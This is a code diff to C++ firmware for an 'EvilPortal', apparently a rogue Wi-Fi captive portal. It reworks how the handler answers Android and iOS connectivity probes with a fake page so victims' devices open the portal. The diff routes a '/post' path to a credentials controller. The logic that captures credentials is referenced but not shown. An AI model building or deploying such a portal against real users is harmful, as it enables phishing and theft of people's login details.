@@ -67,12 +67,13 @@ EvilPortal::~EvilPortal() {}
 void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
     String url = request->url();
 
-    // Android / Samsung / Chrome probes — MUST be 200 with body, never 302
+    // Android / Samsung / Chrome probes — MUST be 200 with body
     if (url == "/generate_204"   || url == "/gen_204" ||
         url == "/generate204"    || url == "/generate_204/" ||
         url.indexOf("generate_204") != -1 ||
         url.indexOf("connectivitycheck") != -1 ||
         url.indexOf("clients3.google") != -1) {
+
         _portal->recordPageView();
         if (_portal->isDefaultHtml)
             request->send(200, "text/html", _portal->htmlPage);
@@ -81,24 +82,12 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
         return;
     }
 
-    if (url.indexOf("generate_204") != -1 ||
-        url.indexOf("gen_204") != -1 ||
-        url.indexOf("connectivitycheck") != -1 ||
-        url.indexOf("clients3.google") != -1) {
-    
-        recordPageView();
-        if (isDefaultHtml)
-            request->send(200, "text/html", htmlPage);
-        else
-            request->send(*fsHtmlFile, htmlFileName, "text/html");
-        return;
-    }
-
-    // iOS / macOS — also prefer 200 with the real page
+    // iOS / macOS
     if (url == "/hotspot-detect.html" ||
         url == "/library/test/success.html" ||
         url == "/success.html" ||
         url.indexOf("hotspot-detect") != -1) {
+
         _portal->recordPageView();
         if (_portal->isDefaultHtml)
             request->send(200, "text/html", _portal->htmlPage);
@@ -107,7 +96,7 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
         return;
     }
 
-    // Normal portal routes
+    // ... rest of the original handler (with _portal-> everywhere)
     if (url == "/")          { _portal->portalController(request); return; }
     if (url == "/post")      { _portal->credsController(request);  return; }
 
